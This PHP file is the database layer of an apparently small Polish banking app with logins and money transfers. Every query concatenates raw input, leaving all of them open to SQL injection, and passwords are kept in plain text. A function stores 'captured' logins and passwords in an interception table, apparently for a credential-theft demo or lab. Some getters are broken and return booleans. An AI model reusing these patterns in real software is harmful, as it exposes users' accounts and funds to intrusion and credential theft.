<?php

require_once("MyDatabase.php");

function isLoginInDB($login){
	return myDbSelect(myDB(),"SELECT login FROM Users WHERE login='". $login."'") != null; 
}

function getLogin($id){
	return myDbSelect(myDB(),"SELECT login FROM Users WHERE ID='". $id."'") != null; 
}

function getUserID($login){
	return myDbSelect(myDB(),"SELECT ID FROM Users WHERE login='". $login."'") != null; 
}

//tak jesli jest, nie jesli nie ma
function isUserInDBLog($login){
	return myDbSelect(myDB(),"SELECT login FROM Users WHERE login='". $login."'") != null;
}

function isUserInDB($login, $password){
	return myDbSelect(myDB(),"SELECT login FROM Users WHERE login='". $login."' AND password='".$password."'") != null;
}

function getUser($login){
	return myDbSelect(myDB(),"SELECT login, password FROM Users WHERE login='". $login."'");
}

function addUserToDB($login, $password){
	myDB() -> query("INSERT INTO `Users`(`login`, `password`) VALUES ('".$login."','".$password."')");
}

function setTransfer($login, $nazwaOdbiorcy, $numerRachunkuOdbiorcy, $kwota, $nazwaZleceniodawcy, $tytulPrzelewu){
	myDB() -> query("INSERT INTO `przelewy`(`login`, `NazwaOdbiorcy`, `NumerRachunkuOdbiorcy`, `Kwota`, `NazwaZleceniodawcy`, `TytulPrzelewu`, `Data`, `Status`) VALUES ('".$login."','".$nazwaOdbiorcy."','".$numerRachunkuOdbiorcy."','".$kwota."','".$nazwaZleceniodawcy."','".$tytulPrzelewu."',NOW(),'Niezatwierdzony')");
}

function getTransfers($login){
	return myDbSelect(myDB(), "SELECT  `ID`,	`login`, `NazwaOdbiorcy`, `NumerRachunkuOdbiorcy`, `Kwota`, `NazwaZleceniodawcy`, `TytulPrzelewu`, `Data`, `Status` FROM przelewy WHERE login='". $login."' ORDER BY Data DESC");
}

function getUnconfirmedTransfers(){
	return myDbSelect(myDB(), "SELECT  `ID`, `login`, `NazwaOdbiorcy`, `NumerRachunkuOdbiorcy`, `Kwota`, `NazwaZleceniodawcy`, `TytulPrzelewu`, `Data`, `Status` FROM przelewy WHERE status='Niezatwierdzony' ORDER BY Data DESC");
}

function confirmTransfer($id){
	myDB() -> query("UPDATE `przelewy` SET `Status`='Zatwierdzony' WHERE `ID`='".$id."'");
}

function addCapturedUserToDB($login, $password){
	myDB() -> query("INSERT INTO `przechwyt`(`login`, `password`) VALUES ('".$login."','".$password."')");
}

?>